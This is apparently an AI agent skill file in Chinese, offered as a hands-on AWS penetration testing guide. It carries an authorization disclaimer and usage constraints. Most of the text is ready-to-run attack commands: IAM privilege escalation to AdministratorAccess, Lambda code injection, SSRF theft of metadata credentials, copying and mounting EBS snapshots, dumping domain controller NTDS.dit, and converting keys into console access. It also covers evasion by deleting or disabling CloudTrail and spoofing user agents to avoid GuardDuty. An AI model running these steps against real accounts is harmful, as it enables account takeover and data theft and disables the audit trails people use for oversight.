---
name: aws-penetration-testing
description: "AWS云环境渗透测试综合技术指南。涵盖IAM枚举、权限提升、SSRF元数据端点攻击、S3存储桶利用、Lambda代码提取及红队持久化技术。触发词：AWS渗透测试、云安全测试、IAM提权、EC2元数据攻击、S3桶漏洞、Lambda利用、AWS红队、云渗透"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅用于授权的安全评估、防御性验证或受控教育环境。

# AWS 渗透测试

## 目的

提供AWS云环境渗透测试的综合技术。涵盖IAM枚举、权限提升、SSRF元数据端点攻击、S3存储桶利用、Lambda代码提取及红队持久化技术。

## 输入/前提条件

- 已配置凭证的AWS CLI
- 有效的AWS凭证（即使是低权限）
- 理解AWS IAM模型
- Python 3、boto3库
- 工具：Pacu、Prowler、ScoutSuite、SkyArk

## 输出/交付物

- IAM权限提升路径
- 提取的凭证和密钥
- 已攻陷的EC2/Lambda/S3资源
- 持久化机制
- 安全审计发现

---

## 核心工具

| 工具 | 用途 | 安装方式 |
|------|------|----------|
| Pacu | AWS利用框架 | `git clone https://github.com/RhinoSecurityLabs/pacu` |
| SkyArk | 影子管理员发现 | `Import-Module .\SkyArk.ps1` |
| Prowler | 安全审计 | `pip install prowler` |
| ScoutSuite | 多云审计 | `pip install scoutsuite` |
| enumerate-iam | 权限枚举 | `git clone https://github.com/andresriancho/enumerate-iam` |
| Principal Mapper | IAM分析 | `pip install principalmapper` |

---

## 核心工作流程

### 步骤1：初始枚举

识别已攻陷的身份和权限：

```bash
# 检查当前身份
aws sts get-caller-identity

# 配置配置文件
aws configure --profile compromised

# 列出访问密钥
aws iam list-access-keys

# 枚举权限
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
```

### 步骤2：IAM枚举

```bash
# 列出所有用户
aws iam list-users

# 列出用户所属组
aws iam list-groups-for-user --user-name TARGET_USER

# 列出附加策略
aws iam list-attached-user-policies --user-name TARGET_USER

# 列出内联策略
aws iam list-user-policies --user-name TARGET_USER

# 获取策略详情
aws iam get-policy --policy-arn POLICY_ARN
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1

# 列出角色
aws iam list-roles
aws iam list-attached-role-policies --role-name ROLE_NAME
```

### 步骤3：元数据SSRF（EC2）

利用SSRF访问元数据端点（IMDSv1）：

```bash
# 访问元数据端点
http://169.254.169.254/latest/meta-data/

# 获取IAM角色名称
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 提取临时凭证
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# 响应包含：
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2019-08-01T05:20:30Z"
}
```

**针对IMDSv2（需要令牌）：**

```bash
# 首先获取令牌
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")

# 使用令牌发起请求
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Fargate容器凭证：**

```bash
# 读取环境变量获取凭证路径
/proc/self/environ
# 查找：AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...

# 访问凭证
http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
```

---

## 权限提升技术

### 影子管理员权限

以下权限等同于管理员：

| 权限 | 利用方式 |
|------|----------|
| `iam:CreateAccessKey` | 为管理员用户创建密钥 |
| `iam:CreateLoginProfile` | 为任意用户设置密码 |
| `iam:AttachUserPolicy` | 为自己附加管理员策略 |
| `iam:PutUserPolicy` | 添加内联管理员策略 |
| `iam:AddUserToGroup` | 将自己加入管理员组 |
| `iam:PassRole` + `ec2:RunInstances` | 启动带管理员角色的EC2 |
| `lambda:UpdateFunctionCode` | 向Lambda注入代码 |

### 为其他用户创建访问密钥

```bash
aws iam create-access-key --user-name target_user
```

### 附加管理员策略

```bash
aws iam attach-user-policy --user-name my_username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 添加内联管理员策略

```bash
aws iam put-user-policy --user-name my_username \
  --policy-name admin_policy \
  --policy-document file://admin-policy.json
```

### Lambda权限提升

```python
# code.py - 注入Lambda函数
import boto3

def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

```bash
# 更新Lambda代码
aws lambda update-function-code --function-name target_function \
  --zip-file fileb://malicious.zip
```

---

## S3存储桶利用

### 存储桶发现

```bash
# 使用bucket_finder
./bucket_finder.rb wordlist.txt
./bucket_finder.rb --download --region us-east-1 wordlist.txt

# 常见存储桶URL模式
https://{bucket-name}.s3.amazonaws.com
https://s3.amazonaws.com/{bucket-name}
```

### 存储桶枚举

```bash
# 列出存储桶（需凭证）
aws s3 ls

# 列出存储桶内容
aws s3 ls s3://bucket-name --recursive

# 下载所有文件
aws s3 sync s3://bucket-name ./local-folder
```

### 公开存储桶搜索

```
https://buckets.grayhatwarfare.com/
```

---

## Lambda利用

```bash
# 列出Lambda函数
aws lambda list-functions

# 获取函数代码
aws lambda get-function --function-name FUNCTION_NAME
# 响应中提供下载URL

# 调用函数
aws lambda invoke --function-name FUNCTION_NAME output.txt
```

---

## SSM命令执行

Systems Manager允许在EC2实例上执行命令：

```bash
# 列出托管实例
aws ssm describe-instance-information

# 执行命令
aws ssm send-command --instance-ids "i-0123456789" \
  --document-name "AWS-RunShellScript" \
  --parameters commands="whoami"

# 获取命令输出
aws ssm list-command-invocations --command-id "CMD-ID" \
  --details --query "CommandInvocations[].CommandPlugins[].Output"
```

---

## EC2利用

### 挂载EBS卷

```bash
# 创建目标卷快照
aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"

# 从快照创建卷
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a

# 附加到攻击者实例
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf

# 挂载并访问
sudo mkdir /mnt/stolen
sudo mount /dev/xvdf1 /mnt/stolen
```

### 影子副本攻击（Windows域控）

```bash
# CloudCopy技术
# 1. 创建域控卷快照
# 2. 与攻击者账户共享快照
# 3. 在攻击者实例中挂载
# 4. 提取NTDS.dit和SYSTEM
secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
```

---

## 从API密钥获取控制台访问

将CLI凭证转换为控制台访问：

```bash
git clone https://github.com/NetSPI/aws_consoler
aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY

# 生成控制台登录URL
```

---

## 清除痕迹

### 禁用CloudTrail

```bash
# 删除追踪
aws cloudtrail delete-trail --name trail_name

# 禁用全局事件
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events

# 禁用特定区域
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events --no-is-multi-region-trail
```

**注意：** Kali/Parrot/Pentoo Linux会根据用户代理触发GuardDuty告警。使用Pacu可修改用户代理。

---

## 快速参考

| 任务 | 命令 |
|------|------|
| 获取身份 | `aws sts get-caller-identity` |
| 列出用户 | `aws iam list-users` |
| 列出角色 | `aws iam list-roles` |
| 列出存储桶 | `aws s3 ls` |
| 列出EC2 | `aws ec2 describe-instances` |
| 列出Lambda | `aws lambda list-functions` |
| 获取元数据 | `curl http://169.254.169.254/latest/meta-data/` |

---

## 约束条件

**必须：**
- 测试前获取书面授权
- 记录所有操作以备审计
- 仅测试授权范围内的资源

**禁止：**
- 未经批准修改生产数据
- 未记录文档的情况下留下持久化后门
- 永久禁用安全控制

**建议：**
- 尝试元数据攻击前检查IMDSv2
- 利用前充分枚举
- 测试结束后清理测试资源

---

## 示例

### 示例1：SSRF到管理员权限

```bash
# 1. 在Web应用中发现SSRF漏洞
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. 从响应中获取角色名称
# 3. 提取凭证
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# 4. 使用窃取的凭证配置AWS CLI
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 5. 验证访问权限
aws sts get-caller-identity
```

---

## 故障排除

| 问题 | 解决方案 |
|------|----------|
| 所有命令都返回Access Denied | 使用enumerate-iam枚举权限 |
| 元数据端点被阻止 | 检查IMDSv2，尝试容器元数据 |
| GuardDuty告警 | 使用Pacu并配置自定义用户代理 |
| 凭证过期 | 从元数据重新获取（临时凭证会轮换） |
| CloudTrail记录操作 | 考虑禁用或日志混淆 |

---

## 其他资源

有关高级技术，包括Lambda/API Gateway利用、Secrets Manager与KMS、容器安全（ECS/EKS/ECR）、RDS/DynamoDB利用、VPC横向移动和安全检查清单，请参阅 [references/advanced-aws-pentesting.md](references/advanced-aws-pentesting.md)。

## 使用时机
本技能适用于执行概述中描述的工作流程或操作。
